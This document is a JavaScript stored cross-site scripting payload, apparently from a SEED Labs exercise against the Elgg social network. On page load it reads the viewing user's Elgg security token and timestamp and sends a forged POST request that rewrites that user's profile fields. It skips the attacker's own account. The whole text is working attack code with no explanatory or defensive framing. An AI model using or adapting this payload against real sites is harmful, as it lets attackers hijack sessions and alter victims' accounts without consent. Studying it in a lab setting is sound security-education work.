<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content=token+ts+"&name="+elgg.session.user.name+"&description=1905033&accesslevel[description]=1&briefdescription=I don't understand but I like this subject&accesslevel[briefdescription]=1&location=Melbourne&accesslevel[location]=1&interests=Reading&accesslevel[interests]=1&skills=None:)&accesslevel[skills]=1&contactemail=alice@example.com&accesslevel[contactemail]=1&phone=0123456789&accesslevel[phone]=1&mobile=0123456789&accesslevel[mobile]=1&website=http://www.diy.com&accesslevel[website]=1&twitter=peace&accesslevel[twitter]=1&guid="+elgg.session.user.guid; //FILL IN
	
	if(elgg.session.user.guid!=59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>